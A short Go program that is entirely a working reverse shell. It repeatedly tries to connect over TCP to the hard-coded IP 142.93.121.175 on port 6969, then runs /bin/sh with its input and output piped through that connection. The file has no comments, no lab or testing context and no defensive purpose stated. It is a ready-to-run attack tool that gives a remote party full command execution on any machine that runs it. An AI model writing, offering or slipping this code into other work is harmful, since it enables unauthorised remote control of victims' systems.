package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	conn := connect("142.93.121.175")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	_ = cmd.Run()
}

func connect(addr string) net.Conn {
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%v:6969", addr))
		if err == nil {
			return conn
		}
	}
}